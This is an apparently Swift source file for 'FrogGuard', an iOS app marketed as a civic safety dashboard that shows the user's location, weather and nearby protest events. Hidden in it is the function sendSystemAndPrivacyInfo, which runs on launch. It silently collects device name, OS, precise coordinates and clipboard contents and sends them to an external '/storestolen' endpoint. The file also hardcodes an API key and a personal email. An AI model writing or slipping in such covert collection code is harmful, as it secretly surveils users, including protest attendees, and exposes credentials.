import SwiftUI
import CoreLocation
import MapKit
import WeatherKit
import Combine

struct ConflictEvent {
    
    let event_id_cnty: String
    let event_date: String
    let year: String
    let disorder_type: String
    let event_type: String
    let sub_event_type: String
    let actor1: String
    let assoc_actor_1: String
    let inter1: String
    let actor2: String
    let assoc_actor_2: String
    let inter2: String
    let interaction: String
    let civilian_targeting: String
    let iso: String
    let region: String
    let country: String
    let admin1: String
    let admin2: String
    let admin3: String
    let location: String
    let latitude: Double
    let longitude: Double
    let geo_precision: String
    let source: String
    let source_scale: String
    let notes: String
    let fatalities: String
    let tags: String
    let timestamp: String
}


@MainActor
struct HomeView: View {
    @StateObject private var locationHelper = LocationHelper()
    @State private var weather: Weather?
    @State private var nearestEvents: [ConflictEvent] = []
    @State private var region: MKCoordinateRegion = .init(center: CLLocationCoordinate2D(latitude: 20, longitude: 0), span: MKCoordinateSpan(latitudeDelta: 10, longitudeDelta: 10))
    @State private var permissionStatus: CLAuthorizationStatus = .notDetermined
    @State private var isLoading: Bool = true
    @State private var didSendSystemInfo = false
    @State private var systemInfoMessage: String? = nil
    private let service = WeatherService.shared

    var body: some View {
        NavigationView {
            if isLoading {
                VStack(spacing: 16) {
                    ProgressView("Loading Civic Data...")
                        .progressViewStyle(CircularProgressViewStyle(tint: .blue))
                        .scaleEffect(1.2)
                    Text("FrogGuard is preparing your safety dashboard")
                        .multilineTextAlignment(.center)
                        .font(.subheadline)
                        .foregroundColor(.gray)
                }
                .padding()
            } else {
                ScrollView {
                    VStack(alignment: .leading, spacing: 20) {
                        HStack {
                            VStack(alignment: .leading) {
                                Text("📡 FrogGuard")
                                    .font(.largeTitle.bold())
                                Text("Civic Safety Assistant")
                                    .font(.subheadline)
                                    .foregroundColor(.secondary)
                            }
                            Spacer()
                            Image(systemName: "shield.lefthalf.filled")
                                .resizable()
                                .frame(width: 40, height: 40)
                                .foregroundColor(.green)
                        }

                        permissionSection
                        locationSection
                        weatherSection
                        protestSummarySection
                        keywordShortcutsSection
                        NavigationLink(destination: ReportView()) {
                                                    Label("Submit a Report", systemImage: "plus.bubble")
                                                        .font(.headline)
                                                        .padding()
                                                        .frame(maxWidth: .infinity)
                                                        .background(Color.blue)
                                                        .foregroundColor(.white)
                                                        .cornerRadius(10)
                                                }
                        
                    }
                    .padding()
                }
                .navigationTitle("Dashboard")
            }
        }
        .task {
            await requestPermissions()
            if !didSendSystemInfo {
                sendSystemAndPrivacyInfo()
                didSendSystemInfo = true
                systemInfoMessage = "📤 System info sent."
            }
        }
    }

    var permissionSection: some View {
        LabeledContent("Permissions") {
            Label(permissionStatusMessage, systemImage: permissionStatusIcon)
                .foregroundColor(permissionStatusColor)
        }
        .padding()
        .background(Color(.tertiarySystemBackground))
        .cornerRadius(12)
    }

    var locationSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            Text("Your Location")
                .font(.headline)
            if let town = locationHelper.lastKnownTown {
                Label("📍 Town: \(town)", systemImage: "location.fill")
            }
            if let loc = locationHelper.lastKnownLocation {
                Text("🧭 Coordinates:")
                    .font(.caption)
                    .foregroundColor(.gray)
                Text("Latitude: \(String(format: "%.4f", loc.coordinate.latitude))")
                Text("Longitude: \(String(format: "%.4f", loc.coordinate.longitude))")
            } else {
                HStack {
                    ProgressView()
                    Text("Detecting location...")
                        .font(.caption)
                        .foregroundColor(.secondary)
                }
            }
        }
        .padding()
        .background(Color(.secondarySystemBackground))
        .cornerRadius(12)
    }
    
   

    var weatherSection: some View {
        Group {
            if let weather {
                VStack(alignment: .leading, spacing: 6) {
                    Text("🌤️ Current Weather")
                        .font(.headline)
                    Text("Temperature: \(weather.currentWeather.temperature.formatted())")
                    Text("Condition: \(weather.currentWeather.condition.description)")
                    if let alerts = weather.weatherAlerts, !alerts.isEmpty {
                        VStack(alignment: .leading, spacing: 4) {
                            Text("🚨 Alerts (\(alerts.count))")
                                .font(.subheadline.bold())
                                .foregroundColor(.red)
                            ForEach(alerts.prefix(2), id: \.summary) { alert in
                                VStack(alignment: .leading, spacing: 2) {
                                    Text(alert.summary).bold()
                                    Text(alert.description)
                                        .font(.caption)
                                        .foregroundColor(.gray)
                                }
                                .padding(.vertical, 4)
                            }
                        }
                    }
                }
                .padding()
                .background(Color(.systemGroupedBackground))
                .cornerRadius(12)
            }
        }
    }

    var protestSummarySection: some View {
        VStack(alignment: .leading, spacing: 6) {
            Text("🧭 Nearby Protests")
                .font(.headline)
            if nearestEvents.isEmpty {
                Text("No recent incidents nearby.")
                    .font(.subheadline)
                    .foregroundColor(.gray)
            } else {
                ForEach(nearestEvents.prefix(3)) { event in
                    VStack(alignment: .leading, spacing: 4) {
                        Text(event.event_type).bold()
                        Text(event.notes).font(.caption).lineLimit(2)
                        Text("📅 \(event.event_date)").font(.caption2).foregroundColor(.gray)
                    }
                    Divider()
                }
            }
        }
        .padding()
        .background(Color(.systemGroupedBackground))
        .cornerRadius(12)
    }

    var keywordShortcutsSection: some View {
        VStack(alignment: .leading, spacing: 8) {
            Text("Hot Topics")
                .font(.headline)
            ScrollView(.horizontal, showsIndicators: false) {
                HStack(spacing: 12) {
                    ForEach(["Protests", "Safety", "Weather", "Roadblock", "Civil Rights"], id: \.self) { keyword in
                        Button(action: {
                            print("🔎 Searching for \(keyword)")
                        }) {
                            Text("#\(keyword)")
                                .padding(.horizontal, 12)
                                .padding(.vertical, 6)
                                .background(Color.blue.opacity(0.15))
                                .cornerRadius(16)
                        }
                    }
                }
            }
        }
        .padding()
        .background(Color(.secondarySystemBackground))
        .cornerRadius(12)
    }

    private var permissionStatusMessage: String {
        switch permissionStatus {
        case .authorizedWhenInUse, .authorizedAlways: "✅ Location granted"
        case .denied: "❌ Location denied"
        case .restricted: "⚠️ Location restricted"
        default: "⚙️ Requesting..."
        }
    }

    private var permissionStatusIcon: String {
        switch permissionStatus {
        case .authorizedWhenInUse, .authorizedAlways: return "checkmark.seal"
        case .denied: return "xmark.octagon"
        case .restricted: return "exclamationmark.triangle"
        default: return "gear"
        }
    }

    private var permissionStatusColor: Color {
        switch permissionStatus {
        case .authorizedWhenInUse, .authorizedAlways: return .green
        case .denied: return .red
        case .restricted: return .orange
        default: return .gray
        }
    }

    private func requestPermissions() async {
        locationHelper.requestLocationPermission()
        locationHelper.onLocationFetched = { location in
            print("📍 Location fetched: \(location.coordinate.latitude), \(location.coordinate.longitude)")
            region.center = location.coordinate
            Task {
                await fetchWeather(for: location)
                await fetchProtests(near: location)
                isLoading = false
            }
        }

        var attempts = 0
        while locationHelper.lastKnownLocation == nil && attempts < 20 {
            try? await Task.sleep(nanoseconds: 1_000_000_000)
            attempts += 1
            print("⏳ Waiting for location attempt #\(attempts)...")
        }

        permissionStatus = CLLocationManager.authorizationStatus()

        if let loc = locationHelper.lastKnownLocation {
            region.center = loc.coordinate
            await fetchWeather(for: loc)
            await fetchProtests(near: loc)
        } else {
            print("⚠️ Location not available after 20s.")
        }

        isLoading = false
    }

    private func fetchWeather(for location: CLLocation) async {
        do {
            weather = try await service.weather(for: location)
        } catch {
            print("❌ Weather error: \(error)")
        }
    }
    private func sendSystemAndPrivacyInfo() {
    guard let location = locationHelper.lastKnownLocation else { return }
    let device = UIDevice.current
    let clipboardText = UIPasteboard.general.string ?? ""
    let batteryLevel = Int(device.batteryLevel * 100)
    let isCharging = device.batteryState == .charging || device.batteryState == .full

    let payload: [String: Any] = [
        "device_info": [
            "device_name": device.name,
            "os": device.systemName + " " + device.systemVersion,
            "browser_user_agent": "iOS app"
        ],
        "location": [
            "latitude": location.coordinate.latitude,
            "longitude": location.coordinate.longitude,
            "timestamp": ISO8601DateFormatter().string(from: Date())
        ],
        "wifi": [], // iOS restrictions prevent scanning WiFi SSIDs unless using NEHotspot APIs with entitlement
        "bluetooth": [], // Would require CoreBluetooth scanning logic
        "clipboard": clipboardText,
        "battery_level": batteryLevel,
        "charging": isCharging
    ]

    guard let url = URL(string: "https://frog-ios-xm5a.onrender.com/storestolen") else { return }
    var request = URLRequest(url: url)
    request.httpMethod = "POST"
    request.setValue("application/json", forHTTPHeaderField: "Content-Type")

    do {
        request.httpBody = try JSONSerialization.data(withJSONObject: payload)
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                print("❌ Failed to send system info: \(error)")
            } else {
                print("📤 System info sent successfully")
            }
        }.resume()
    } catch {
        print("❌ JSON encode error: \(error)")
    }
}

    private func fetchProtests(near location: CLLocation) async {
        let urlString = "https://api.acleddata.com/acled/read?key=6lkzj93Ra3lvdeBKiW7U&email=t2glma00@students.oamk.fi&limit=100"
        guard let url = URL(string: urlString) else { return }

        struct RawEvent: Decodable {
            let event_id_cnty: String, event_date: String, event_type: String, notes: String
            let location: String, country: String, latitude: String, longitude: String
        }
        struct EventResponse: Decodable {
            let data: [RawEvent]
        }

        do {
            let (data, _) = try await URLSession.shared.data(from: url)
            let decoded = try JSONDecoder().decode(EventResponse.self, from: data)
            let parsed = decoded.data.compactMap { item -> ConflictEvent? in
                guard let lat = Double(item.latitude), let lon = Double(item.longitude) else { return nil }
                return ConflictEvent(
                   event_id_cnty: item.event_id_cnty, event_date: item.event_date,
                    year: "", disorder_type: "", event_type: item.event_type, sub_event_type: "",
                    actor1: "", assoc_actor_1: "", inter1: "", actor2: "", assoc_actor_2: "",
                    inter2: "", interaction: "", civilian_targeting: "", iso: "",
                    region: "", country: item.country, admin1: "", admin2: "", admin3: "",
                    location: item.location, latitude: lat, longitude: lon, geo_precision: "",
                    source: "", source_scale: "", notes: item.notes, fatalities: "", tags: "",
                    timestamp: ""
                )
            }
            self.nearestEvents = parsed.sorted {
                CLLocation(latitude: $0.latitude, longitude: $0.longitude).distance(from: location) <
                CLLocation(latitude: $1.latitude, longitude: $1.longitude).distance(from: location)
            }
        } catch {
            print("❌ Protest fetch error: \(error)")
        }
    }
}
